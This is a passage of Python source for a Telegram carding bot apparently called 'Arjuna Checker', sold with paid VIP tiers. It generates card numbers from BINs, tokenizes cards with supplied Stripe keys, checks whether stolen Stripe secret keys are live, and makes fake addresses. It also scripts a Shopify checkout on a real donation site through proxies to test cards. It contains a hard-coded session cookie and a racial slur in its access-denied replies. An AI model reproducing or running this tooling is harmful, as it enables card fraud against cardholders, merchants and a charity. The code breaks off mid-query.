            cc_number = cc_info[0]
            exp_month = cc_info[1]
            exp_year = cc_info[2]
            cvc = cc_info[3]

            pmm = pm_credit_card(cc_number, exp_month, exp_year, cvc, publishable_key)

            if user_id in OWNER_USERS:
                user_type = "OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = "PREMIUM"
            else:
                user_type = "〚𝘍𝘙𝘌𝘌〛"
            if pmm:
                message_text = f"✫ CC PM CREATOR✫ \n---------------------------------\n`{pmm}`\n\nRole :  {user_type}"
            else:
                message_text = f"Error"

            bot.send_message(message.chat.id, message_text, reply_to_message_id=message.message_id, parse_mode="Markdown")
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")
    else:
        bot.send_message(message.chat.id, "SEEMS LIKE YOU ARE NOT REGISTERED, USE /register TO START YOUR JOURNEY.", reply_to_message_id=message.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['tok'])
@bot.message_handler(func=lambda message: message.text.lower().startswith('.tok'))
def handle_cc(message):
    user_id = message.from_user.id
    if user_id in REGISTERED_USERS:
        try:
            params = message.text.split()
            publishable_key = message.text.split()[1]
            cc_info = params[2].split('|')
            cc_number = cc_info[0]
            exp_month = cc_info[1]
            exp_year = cc_info[2]
            cvc = cc_info[3]

            token = tokenize_credit_card(cc_number, exp_month, exp_year, cvc, publishable_key)

            if user_id in OWNER_USERS:
                user_type = "OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = "PREMIUM"
            else:
                user_type = "〚𝘍𝘙𝘌𝘌〛"
            if token:
                message_text = f"✫ CC TOKENIZER ✫ \n---------------------------------\n`{token}`\n\nRole :  {user_type}"
            else:
                message_text = f"Error"

            bot.send_message(message.chat.id, message_text, reply_to_message_id=message.message_id, parse_mode="Markdown")
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")
    else:
        bot.send_message(message.chat.id, "SEEMS LIKE YOU ARE NOT REGISTERED, USE /register TO START YOUR JOURNEY.", reply_to_message_id=message.message_id, parse_mode="Markdown")

def ccgenn2(bin_number, cvv_length=3, month_length=2, year_length=2):
    def calculate_checksum(ccn):
        def get_digits(n):
            return [int(d) for d in str(n)]

        digits = get_digits(ccn)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        total = sum(odd_digits)
        for digit in even_digits:
            total += sum(get_digits(digit * 2))
        return total % 10

    def generate_random_digit():
        return random.randint(0, 9)

    def generate_ccn(bin_number):
        ccn = bin_number
        while len(ccn) < 15:
            ccn += str(generate_random_digit())
        checksum = calculate_checksum(ccn + '0')
        ccn += str((10 - checksum) % 10)
        return ccn

    ccns = []
    for _ in range(10):
        ccn = generate_ccn(bin_number)
        expiration_month = str(random.choice(range(1, 13))).zfill(month_length)
        expiration_year = str(random.choice(range(datetime.date.today().year + 1, datetime.date.today().year + 8)))[-year_length:]
        cvv = str(random.randrange(10 ** (cvv_length - 1), 10 ** cvv_length)).zfill(cvv_length)
        ccns.append((ccn, expiration_month, expiration_year, cvv))
    return ccns

@bot.message_handler(commands=['cgen'])
@bot.message_handler(func=lambda message: message.text.lower().startswith('.cgen'))
def handle_cc(message):
    user_id = message.from_user.id
    if user_id in REGISTERED_USERS:
        try:
            command_parts = message.text.split()
            if len(command_parts) != 4:
                raise ValueError("Invalid command format. Usage: /gen [BIN] [MM] [YY]")

            bin_number = command_parts[1]
            exp_month = command_parts[2].zfill(2)
            exp_year = command_parts[3][-2:].zfill(2)

            print("got bin:", bin_number)
            ccns = ccgenn2(bin_number, month_length=2, year_length=2)

            first6 = bin_number[:6]

            rrr = requests.get(f"https://bins.antipublic.cc/bins/{first6}")
            print(rrr.text)
            data = json.loads(rrr.text)

            binn = data["bin"]
            brand = data["brand"]
            country = data["country"]
            bank = data["bank"]
            level = data["level"]
            card_type = data["type"]
            flag = data["country_flag"]
            currencies2 = ', '.join(data["country_currencies"])

            user_type = "〚𝘍𝘙𝘌𝘌〛"
            if user_id in OWNER_USERS:
                user_type = "OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = "PREMIUM"

            message_text = f"✫ 𝘾𝘾 𝙂𝙀𝙉𝙀𝙍𝘼𝙏𝙊𝙍 ✫\n\n𝙀𝙓𝙏𝙍𝘼𝙋: `{bin_number}` \n---------------------------------\n"
            for ccn_info in ccns:
                ccn, _, _, cvv = ccn_info
                message_text += f"`{ccn}|{exp_month}|{exp_year}|{cvv}`\n"
            message_text += f"---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY : @LakshayFR\n"

            bot.send_message(message.chat.id, message_text, reply_to_message_id=message.message_id, parse_mode="Markdown")
        except IndexError:
            bot.send_message(message.chat.id, "Please provide a BIN number, expiration month, and expiration year after /gen command.")
        except ValueError as ve:
            bot.send_message(message.chat.id, f"Error: {ve}")
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")
    else:
        bot.send_message(message.chat.id, "SEEMS LIKE YOU ARE NOT REGISTERED, USE /register TO START YOUR JOURNEY.", reply_to_message_id=message.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['gen'])
@bot.message_handler(func=lambda message: message.text.lower().startswith('.gen'))
def handle_cc(message):
    user_id = message.from_user.id
    if user_id in REGISTERED_USERS:
        try:
            bin_number = message.text.split()[1]
            print("got bin: ", {bin_number})
            ccns = ccgenn(bin_number)

            first6 = bin_number[:6]

            rrr = requests.get(f"https://bins.antipublic.cc/bins/{first6}", proxies=proxies)
            print(rrr.text)
            data = json.loads(rrr.text)

            binn = data["bin"]
            brand = data["brand"]
            country = data["country"]
            bank = data["bank"]
            level = data["level"]
            card_type = data["type"]
            flag = data["country_flag"]
            currencies2 = ', '.join(data["country_currencies"])

            user_type = f"〚𝘍𝘙𝘌𝘌〛"
            if user_id in OWNER_USERS:
                user_type = f"OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = f"PREMIUM"

            message_text = f"✫ 𝗖𝗖 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥 ✫\n𝙀𝙓𝙏𝙍𝘼𝙋: `{bin_number}` \n---------------------------------\n"
            for ccn_info in ccns:
                ccn, exp_month, exp_year, cvv = ccn_info
                message_text += f"`{ccn}|{exp_month}|{exp_year}|{cvv}`\n"
            message_text += f"---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"

            bot.send_message(message.chat.id, message_text, reply_to_message_id=message.message_id, parse_mode="Markdown")
        except IndexError:
            bot.send_message(message.chat.id, "Please provide a BIN number after /gen command.")
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")
    else:
        bot.send_message(message.chat.id, "SEEMS LIKE YOU ARE NOT REGISTERED, USE /register TO START YOUR JOURNEY.", reply_to_message_id=message.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['addr'])
@bot.message_handler(func=lambda message: message.text.lower().startswith('.addr'))
def handle_cc(message):
    user_id = message.from_user.id
    if user_id in REGISTERED_USERS:
        try:
            country_code = message.text.split(' ')[1]

            fake_info = generate_fake_info(country_code)

            if user_id in OWNER_USERS:
                user_type = "OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = "PREMIUM"
            else:
                user_type = "〚𝘍𝘙𝘌𝘌〛"
            message_text = f"{fake_info}\nRole :    {user_type}"

            bot.send_message(message.chat.id, message_text, reply_to_message_id=message.message_id, parse_mode="Markdown")
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")
    else:
        bot.send_message(message.chat.id, "SEEMS LIKE YOU ARE NOT REGISTERED, USE /register TO START YOUR JOURNEY.", reply_to_message_id=message.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['bin'])
@bot.message_handler(func=lambda message: message.text.lower().startswith('.bin'))
def handle_cc(message):
    user_id = message.from_user.id
    if user_id in REGISTERED_USERS:
        try:
            bin = message.text.split()[1]

            result = bindat(bin)

            if user_id in OWNER_USERS:
                user_type = "OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = "PREMIUM"
            else:
                user_type = "〚𝘍𝘙𝘌𝘌〛"
            message_text = f"{result}\nRole:{user_type}"

            bot.send_message(message.chat.id, message_text, reply_to_message_id=message.message_id, parse_mode="Markdown")
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")
    else:
        bot.send_message(message.chat.id, "SEEMS LIKE YOU ARE NOT REGISTERED, USE /register TO START YOUR JOURNEY.", reply_to_message_id=message.message_id, parse_mode="Markdown")

# HAS to be here, sorry

def chcksk(sk_key: str) -> bool:
    try:
        print(f"Checking SK key: {sk_key}...")
        response = requests.get("https://api.stripe.com/v1/customers", auth=(sk_key, ""))
        return response.status_code == 200
    except Exception as e:
        return f"An error occurred while checking SK key: {e}"

@bot.message_handler(commands=['sk'])
@bot.message_handler(func=lambda message: message.text.lower().startswith('.sk'))
def handle_cc(message):
    user_id = message.from_user.id
    if user_id in REGISTERED_USERS:
        try:
            sk_key = message.text.split()[1]

            result = chcksk(sk_key)

            if user_id in OWNER_USERS:
                user_type = "OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = "PREMIUM"
            else:
                user_type = "〚𝘍𝘙𝘌𝘌〛"
            message_text = f"✫ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ✫\n---------------------------------\n𝗞𝗲𝘆: {sk_key}\n\n𝗟𝗜𝗩𝗘 : {result}\n---------------------------------\n\nBOT BY ⍟ : @LakshayFR\nRole :  {user_type}"

            bot.send_message(message.chat.id, message_text, reply_to_message_id=message.message_id, parse_mode="Markdown")
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")
    else:
        bot.send_message(message.chat.id, "SEEMS LIKE YOU ARE NOT REGISTERED, USE /register TO START YOUR JOURNEY.", reply_to_message_id=message.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['pf'])
@bot.message_handler(func=lambda message: message.text.lower().startswith('.pf'))
def handle_cc(message):
    user_id = message.from_user.id
    if user_id in PREMIUM_USERS:
        try:
            cc, mes, ano, cvv = message.text.split()[1].split("|")

            result =  payflowsega(cc, mes, ano, cvv)

            if user_id in OWNER_USERS:
                user_type = "『𝙊𝙒𝙉𝙀𝙍』"
            elif user_id in PREMIUM_USERS:
                user_type = "PREMIUM"

            bot.send_message(message.chat.id,  f"{result}\nRole:{user_type}" , reply_to_message_id=message.message_id, parse_mode="Markdown")
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")
    else:
        bot.send_message(message.chat.id, "SEEMS LIKE YOU ARE NOT A MAGICIAN ! BUY VIP ACCESS FROM OWNER TO USE THIS GATE.", reply_to_message_id=message.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['start'])
def start(message):
	name = message.from_user.first_name
	id=message.from_user.id
	keyboard = telebot.types.InlineKeyboardMarkup()
	keyboard.row(telebot.types.InlineKeyboardButton('FREE GATES', callback_data='fgate'))
	keyboard.row(telebot.types.InlineKeyboardButton('PREMIUM GATES', callback_data='pgate'))
	keyboard.row(telebot.types.InlineKeyboardButton('OTHER TOOLS', callback_data='misc'))
	keyboard.row(telebot.types.InlineKeyboardButton('FUN', callback_data='fun'))
	keyboard.row(telebot.types.InlineKeyboardButton('Buy VIP', callback_data='buyvip'))
	
	with open('lakshay.mp4', 'rb') as video_file:
		video_data = video_file.read()
		bot.send_video(message.chat.id, video_data, caption=f'''<b>HELLO {name}, \n\nWELCOME TO ARJUNA CHECKER !✨\n\n♻️ STATUS : ALIVE ✅ </b>''', parse_mode='HTML' , reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == 'fgate':
        markup = telebot.types.InlineKeyboardMarkup()
        bot.delete_message(call.message.chat.id, call.message.message_id)
        markup.row(telebot.types.InlineKeyboardButton("Back", callback_data='back'))
        bot.send_message(call.message.chat.id, ''' <b>         ➡️ 𝙁𝙍𝙀𝙀 𝙂𝘼𝙏𝙀𝙎  \n\n- - - - - - - - - - - - - - - - - - -\n ⭕ STRIPE 1$ \n • COMMAND : /hq\n • STATUS : ON ✅\n- - - - - - - - - - - - - - - - - - -\n ⭕ WEBSITE GATES CHECKER  \n • COMMAND: /url "your url" \n • STATUS : ON✅</b> \n- - - - - - - - - - - - - - - - - - - ''', reply_markup=markup)
    if call.data == 'pgate':
        markup = telebot.types.InlineKeyboardMarkup()
        bot.delete_message(call.message.chat.id, call.message.message_id)
        markup.row(telebot.types.InlineKeyboardButton("Back", callback_data='back'))
        bot.send_message(call.message.chat.id, '''<b>            ➡️ 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙂𝘼𝙏𝙀𝙎\n ━━━━━━━━━━━━\n ⭕  𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝟱$ \n• COMMAND : /cc\n• STATUS: OFF ❌\n━━━━━━━━━━━━\n⭕ PAYPAL AUTH \n• COMMAND : /pp \n• STATUS: OFF ❌ \n━━━━━━━━━━━━\n⭕  𝗣𝗔𝗬𝗙𝗟𝗢𝗪  \n• COMMAND : /pf\n• STATUS: OFF ❌\n━━━━━━━━━━━━\n⭕ RECURLY \n• COMMAND : /rc\n• STATUS: OFF ❌\n━━━━━━━━━━━━\n⭕ SHOPIFY GATES \n• COMMANDS:\n/sh1, /sh2, /sh3 , /sh4, /sh5, /sh5, /sh6, /sh7, /sh8, /sh9\n• STATUS : ON ✅\n━━━━━━━━━━━━\n→  COUNT : 5</b>''', reply_markup=markup)
    elif call.data == 'fun':
        markup = telebot.types.InlineKeyboardMarkup()
        bot.delete_message(call.message.chat.id, call.message.message_id)
        markup.row(telebot.types.InlineKeyboardButton("Back", callback_data='back'))
        bot.send_message(call.message.chat.id, '''<b>FUN COMMANDS \n\n- - - - - - - - - - - - - - - - - - -\n - × COMMAND - /quote \n × USAGE - Madara Uchiha Quotes</b>''', reply_markup=markup)
    if call.data == 'misc':
        markup = telebot.types.InlineKeyboardMarkup()
        bot.delete_message(call.message.chat.id, call.message.message_id)
        markup.row(telebot.types.InlineKeyboardButton("Back", callback_data='back'))
        bot.send_message(call.message.chat.id, '''<b>             ➡️OTHER FEATURES \n\n- - - - - - - - - - - - - - - - - - -\n • COMMAND - /bin \n × USAGE - /bin bin \n • GET DATA OF ANY BIN \n • STATUS - ON ✅ \n- - - - - - - - - - - - - - - - - - -\n  • COMMAND - /sk \n • USAGE - /sk sk key \n • CHECK SK KEY \n • STATUS - ON ✅\n- - - - - - - - - - - - - - - - - - -\n • COMMAND - /gen \n • USAGE - /gen bin \n • GENERATE CCS FROM BIN \n • STATUS - ON ✅ \n- - - - - - - - - - - - - - - - - - -\n • COMMAND - /cgen \n × USAGE - /cgen BIN|MONTH|YEAR \n • GENERATE CC FROM EXTRAP \n • STATUS - ON ✅ \n- - - - - - - - - - - - - - - - - - -\n  • COMMAND - /addr \n • USAGE - /addr country code , like: us, uk \n • FAKE ADDRESS \n • STATUS - ON ✅ \n- - - - - - - - - - - - - - - - - - -\n  • COMMAND - /ipscore \n • USAGE - /ipscore ip \n • GET IP FRAUD SCORE \n • STATUS: OFF ❌ \n- - - - - - - - - - - - - - - - - - -\n  • COMMAND - /pmk \n • USAGE - /pmk pk key cc \n • PAYMENT KEY CREATOR \n × STATUS - ON ✅ \n- - - - - - - - - - - - - - - - - - -\n  • COMMAND - /tok \n • USAGE - /tok pk key cc \n • CC TOK CREATOR \n • STATUS: OFF ❌</b>\n- - - - - - - - - - - - - - - - - - -\n''', reply_markup=markup)
    elif call.data == 'buyvip':
        markup = telebot.types.InlineKeyboardMarkup()
        bot.delete_message(call.message.chat.id, call.message.message_id)
        markup.row(telebot.types.InlineKeyboardButton("Back", callback_data='back'))
        bot.send_message(call.message.chat.id, '''<b>➡️ BUY VIP ACCESS  \n- - - - - - - - - - - - - - - - - - -\n • DM @LAKSHAYFR TO BUY VIP ACCESS</b>''' ,reply_markup=markup)
    elif call.data == 'back':
        start(call.message)
        bot.delete_message(call.message.chat.id, call.message.message_id)

@bot.message_handler(commands=['spam'])
@bot.message_handler(func=lambda message: message.text.lower().startswith('.spam'))
def spam(message):
    if len(message.text.split()) > 1:
        spam_message = ' '.join(message.text.split()[1:])
        count = 5
        for _ in range(count):
            bot.send_message(message.chat.id, spam_message)
    else:
        bot.send_message(message.chat.id, "Please provide a message to spam.")

@bot.message_handler(commands=['quote'])
def quote(message):
    q = ['“It seems that you still want to dance but… You will not be able to make steps anymore”', '“Talking about peace whilst spilling blood, it’s something that only humans can do”','“Would you consider dying together “Teamwork” as well ?”','“The face of my enemy scares me only when I realize how much it resembles mine”','“The concept of hope is nothing more than giving up. A word that holds no true meaning”','“Wake up to reality! Nothing ever goes as planned in this world. The longer you live, the more you realize that in this reality only pain, suffering and futility exist”','“It will be a new world, A world of truth, not lies”','“The Uchiha is a clan destined for revenge”','“Power is not will, it is the phenomenon of physically making things happen”','“Love is not necessary, power is the only true necessity”','“How good can there be in power if you can not protect those you love?”','“As I walk towards my true dream, I will enjoy fighting with you. ”','“Sometimes falling back is the best way to achieve happiness and love”','“When he died, no, even in death, I was thinking of you”','“The person with the best dreams has the best chances of winning”']
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(telebot.types.InlineKeyboardButton('Generate One More', callback_data='more'))
    quotes = random.choice(q)
    bot.send_message(message.chat.id, quotes, reply_markup=keyboard)

@bot.message_handler(commands=['announce'])
def announce(message):
    if is_admin(message.from_user.id):
        announcement = message.text.split('/announce ', 1)[1]
        for user_id in REGISTERED_USERS:
            try:
                bot.send_message(user_id, announcement)
            except Exception as e:
                print(f"Failed to send announcement to user {user_id}: {e}")
        bot.reply_to(message, "Announcement sent to all users.")
    else:
        bot.reply_to(message, "SLEEP NIGGA")

@bot.callback_query_handler(func=lambda call: call.data == 'more')
def generate_more_quote(call):
    q = ['“It seems that you still want to dance but… You will not be able to make steps anymore”', '“Talking about peace whilst spilling blood, it’s something that only humans can do”','“Would you consider dying together “Teamwork” as well ?”','“The face of my enemy scares me only when I realize how much it resembles mine”','“The concept of hope is nothing more than giving up. A word that holds no true meaning”','“Wake up to reality! Nothing ever goes as planned in this world. The longer you live, the more you realize that in this reality only pain, suffering and futility exist”','“It will be a new world, A world of truth, not lies”','“The Uchiha is a clan destined for revenge”','“Power is not will, it is the phenomenon of physically making things happen”','“Love is not necessary, power is the only true necessity”','“How good can there be in power if you can not protect those you love?”','“As I walk towards my true dream, I will enjoy fighting with you. ”','“Sometimes falling back is the best way to achieve happiness and love”','“When he died, no, even in death, I was thinking of you”','“The person with the best dreams has the best chances of winning”']
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(telebot.types.InlineKeyboardButton('Generate One More', callback_data='more'))
    quotes = random.choice(q)
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=quotes, reply_markup=keyboard)

@bot.message_handler(commands=['authadmin'])
def add_admin(message):
    if is_admin(message.from_user.id):
        try:
            new_admin_id = int(message.text.split(' ')[1])
            ADMIN_IDS.append(new_admin_id)
            save_user_ids_to_file(ADMIN_IDS_FILE, ADMIN_IDS)
            bot.reply_to(message, f"✅ User {new_admin_id} has been added as an admin.")
        except IndexError:
            bot.reply_to(message, "Please provide a user ID.")
        except ValueError:
            bot.reply_to(message, "Invalid User ID.")
    else:
        bot.reply_to(message, "SLEEP NIGGA")

@bot.message_handler(commands=['register'])
def register_user(message):
    user_id = message.from_user.id
    if user_id not in REGISTERED_USERS:
        REGISTERED_USERS.append(user_id)
        save_user_ids_to_file(REGISTERED_USERS_FILE, REGISTERED_USERS)
        bot.reply_to(message, " DM @LakshayFR TO REGISTER (IT'S FREE)")
    else:
        bot.reply_to(message, "You are already registered.")

@bot.message_handler(commands=['auth'])
def add_authorized_user(message):
    if is_admin(message.from_user.id):
        try:
            new_user_id = int(message.text.split(' ')[1])
            PREMIUM_USERS.append(new_user_id)
            save_user_ids_to_file(PREMIUM_USERS_FILE, PREMIUM_USERS)
            bot.reply_to(message, f"✅ User {new_user_id} has been added as a VIP user.")
        except IndexError:
            bot.reply_to(message, "Please provide a user ID.")
        except ValueError:
            bot.reply_to(message, "Invalid User ID.")
    else:
        bot.reply_to(message, "SLEEP NIGGA")

@bot.message_handler(commands=['unauth'])
def remove_authorized_user(message):
    if is_admin(message.from_user.id):
        try:
            user_to_remove = int(message.text.split(' ')[1])
            if user_to_remove in AUTHORIZED_USERS:
                AUTHORIZED_USERS.remove(user_to_remove)
                save_user_ids_to_file(AUTHORIZED_USERS_FILE, AUTHORIZED_USERS)
                bot.reply_to(message, f"✅ User {user_to_remove} has been removed from the authorized users list.")
            else:
                bot.reply_to(message, f"The user ID {user_to_remove} is not in the authorized users list.")
        except IndexError:
            bot.reply_to(message, "Please provide a user ID.")
        except ValueError:
            bot.reply_to(message, "Invalid User ID.")
    else:
        bot.reply_to(message, "SLEEP NIGGA")


# checking functions

def stripe(cc, mes, ano, cvv):
    r = requests.Session()
    c6 = cc[:6]
    cc1                 = cc[:4]
    cc2                 = cc[4:8]
    cc3                 = cc[8:12]
    cc4                 = cc[12:]


    url = "https://www.popforacause.org/cart/add.js"
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*"
}
    data = {
    "form_type": "product",
    "utf8": "✓",
    "id": "34509026721951",
    "product-id": "5252615798943",
    "section-id": "product-template"
}
    response = r.post(url, headers=headers, data=data, proxies=proxies)

    response = r.get("https://www.popforacause.org/cart.js", headers=headers, proxies=proxies)
    token = response.json()["token"]

    checkout = "https://www.popforacause.org/checkout"
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*"
}

    response = r.get(checkout, headers=headers,allow_redirects=True)
    x_checkout_one_session_token = find_between(response.text, 'serialized-session-token" content="&quot;', '&quot;"')
    queue_token                  = find_between(response.text, '''queue_token=' + "''', '"')
    stable_id                    = find_between(response.text, 'stableId&quot;:&quot;', '&quot;')
    paymentMethodIdentifier      = find_between(response.text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "Content-Type": "application/json"
}
    data = {
    "credit_card": {
        "number": '{} {} {} {}'.format(cc1, cc2, cc3, cc4),
        "month": mes,
        "year": ano,
        "verification_value": cvv,
        "start_month": None,
        "start_year": None,
        "issue_number": "",
        "name": "Techno"
    },
    "payment_session_scope": "www.popforacause.org"
}

    response = r.post("https://deposit.shopifycs.com/sessions", headers=headers,json=data, proxies=proxies)

    sessionid = response.json()["id"]

    headers5 = {
    'accept': 'application/json',
    'accept-language': 'en',
    'content-type': 'application/json',
    # 'cookie': 'secure_customer_sig=; localization=US; cart_currency=USD; _cmp_a=%7B%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22sale_of_data_region%22%3Afalse%7D; _tracking_consent=%7B%22con%22%3A%7B%22CMP%22%3A%7B%22a%22%3A%22%22%2C%22s%22%3A%22%22%2C%22p%22%3A%22%22%2C%22m%22%3A%22%22%7D%7D%2C%22v%22%3A%222.1%22%2C%22reg%22%3A%22%22%2C%22region%22%3A%22INTN%22%7D; _shopify_y=fc2515f3-ca66-4ee5-93a1-a9ed6dc6a106; _orig_referrer=https%3A%2F%2Fweb.telegram.org%2F; _landing_page=%2F; receive-cookie-deprecation=1; _shopify_sa_p=; cart=Z2NwLWFzaWEtc291dGhlYXN0MTowMUhUOVZQWE5UUENORFM0RlRNOENQQ05RNA; cart_sig=fe12c356e1409729e830864f99e8a794; keep_alive=e5d183b0-7396-4df2-a58a-097a8606f525; checkout_session_lookup=%7B%22version%22%3A1%2C%22keys%22%3A%5B%7B%22source_id%22%3A%22Z2NwLWFzaWEtc291dGhlYXN0MTowMUhUOVZQWE5UUENORFM0RlRNOENQQ05RNA%22%2C%22checkout_session_identifier%22%3A%22aa6f7dbeb2f022c94c91d12b20b926cc%22%2C%22source_type_abbrev%22%3A%22cn%22%2C%22updated_at%22%3A%222024-03-31T08%3A59%3A56.585Z%22%7D%5D%7D; checkout_session_token__cn__Z2NwLWFzaWEtc291dGhlYXN0MTowMUhUOVZQWE5UUENORFM0RlRNOENQQ05RNA=%7B%22token%22%3A%22Z1YvTGdLNys1Vk5RTGE3VjhPQlM2TkNONnNqUzhidnRMMmZ1blUyb3RkZ0xlUXBldkwySmt2OWdhS1M3Z25pM2NpSEN1bVdEcUdKdVBOYTZteHJwcWVIcE54V2dMQ2hETnpEemdEQXZGZFJOSmVvczk3SDFYNzQ4NHYwd09uNUYxWmdPZ2lGOGpmZkZTT2xycGNzbERlYTFSUEJYYXNUL3JjWHJUc0pKQmc5WDVObkNUTXZlbGIzV1dzSHVPZUlyUkt5dDhqQ2psUzJ3ZWlnMitEY1R2RUhyQnlzMzhUcDdOR0NDcktmeTF4M3J6K05ZWWt2bDlaUk1FVzVpSW15Z0VoMVU2VzZGRlUzUGVvT3EyQy9IbWhscVpicmZzZXc3MmNzZ3d1cTdTZWl3WHc9PS0tZXU4aEYxVzd2TmQycnB5Ky0tUjdqdXdNTFo5RWVYQjV1ZHNPMlJzZz09%22%2C%22locale%22%3A%22en%22%2C%22checkout_session_identifier%22%3A%22aa6f7dbeb2f022c94c91d12b20b926cc%22%2C%22permanent_domain%22%3A%22pop-for-a-cause.myshopify.com%22%2C%22cart_preview%22%3A%7B%22cart_ts%22%3A%221711875596%22%2C%22cart_sig%22%3A%22fe12c356e1409729e830864f99e8a794%22%2C%22is_dryrun%22%3Afalse%2C%22cart%22%3A%7B%22token%22%3A%22Z2NwLWFzaWEtc291dGhlYXN0MTowMUhUOVZQWE5UUENORFM0RlRNOENQQ05RNA%22%2C%22original_item_count%22%3A1%2C%22items%22%3A%5B%7B%22id%22%3A34509026721951%2C%22quantity%22%3A1%2C%22final_line_price%22%3A500%2C%22product_title%22%3A%22Donate%2BHere!%22%2C%22variant_title%22%3A%225%22%2C%22featured_image%22%3A%7B%22alt%22%3A%22Donate%2BHere!%22%2C%22url%22%3A%22https%3A%2F%2Fcdn.shopify.com%2Fs%2Ffiles%2F1%2F0397%2F1609%2F4111%2Fproducts%2F72173cbeea.png%3Fv%3D1590880969%22%7D%7D%5D%2C%22currency%22%3A%22USD%22%2C%22had_truncated_line_items%22%3Afalse%7D%7D%7D; skip_shop_pay=false; _shopify_s=5a832320-3ebb-4c8b-a016-3991633904d0; _shopify_sa_t=2024-03-31T09%3A00%3A28.275Z; cart_ts=1711875781; queue_token=AoH_2V6YhYZSphINN1E_ycWN68sWE2aNn4ZJW6x42Kkfg_tkfOfoF49_86s64djCcmHI23DiOcfu_szDnDj4djiTBVm6TS948i1MME9gXMeTdmCYLozebbe9f5aagt9FbLdPcvAtt0M5FZJHr0vpLJgLBAI1iB1ZoJEPGDTQIHVFu3SLvcCy8wNJ',
    'origin': 'https://www.popforacause.org',
    'referer': 'https://www.popforacause.org/',
    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'x-checkout-one-session-token': '{x_checkout_one_session_token}',
    'x-checkout-web-build-id': '5c00fdbd8287cb86b70726c21929d2fddbe095b3',
    'x-checkout-web-deploy-stage': 'production',
    'x-checkout-web-server-handling': 'fast',
    'x-checkout-web-source-id': '{token}',
}

    json_data5 = {
    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on 